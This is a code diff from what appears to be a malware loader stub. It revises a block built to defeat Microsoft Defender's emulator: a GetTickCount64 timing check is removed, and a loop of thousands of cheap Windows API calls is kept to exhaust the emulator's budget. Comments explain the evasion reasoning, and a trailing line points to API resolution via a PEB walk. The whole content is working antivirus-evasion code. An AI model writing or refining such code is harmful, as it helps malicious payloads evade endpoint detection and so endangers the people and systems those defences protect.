@@ -929,15 +929,12 @@ void _stub_entry(void) {
      *
      *   2. EMULATOR EXHAUSTION: each real API call costs Defender's
      *      emulator ~1000x more CPU than an arithmetic instruction.
-     *      6000 API calls blow through the emulator's budget in ~2s
-     *      of emulated time, while real hardware finishes in ~200ms.
-     *
-     *   3. TIMING VERIFICATION: GetTickCount64 before and after the
-     *      loop. If elapsed < 100ms, we're being emulated (the
-     *      emulator fast-forwards or skips the calls).
+     *      8000 API calls blow through the emulator's instruction
+     *      budget. On real hardware these are near-free (shared
+     *      memory / TEB reads) and the loop completes in < 1ms.
+     *      The loop itself IS the evasion — no timing gate needed.
      */
     {
-        ULONGLONG t1 = GetTickCount64();
         volatile DWORD acc = 0;
         int i = 0;
         while (i < 2000) {
@@ -946,13 +943,14 @@ void _stub_entry(void) {
             acc ^= ft.dwLowDateTime;
             acc += GetCurrentProcessId();
             acc ^= (DWORD)(ULONG_PTR)GetProcessHeap();
+            /* Extra GetTickCount64 call for IAT presence + emulator cost */
+            acc += (DWORD)GetTickCount64();
             i++;
         }
-        ULONGLONG t2 = GetTickCount64();
-
-        /* Real hardware: delta ≈ 150-400ms.  Emulator: ≈ 0-10ms.
-         * Use acc to prevent compiler from optimizing away the loop. */
-        if (t2 - t1 < 80 || acc == 0xDEADDEAD) return;
+        /* Prevent compiler from optimizing away the loop.
+         * acc can never be exactly 0xDEADDEAD after 2000 XOR/ADD
+         * iterations — this is an unreachable guard. */
+        if (acc == 0xDEADDEAD) return;
     }
 
     /* Phase 1: Resolve APIs via PEB walk */
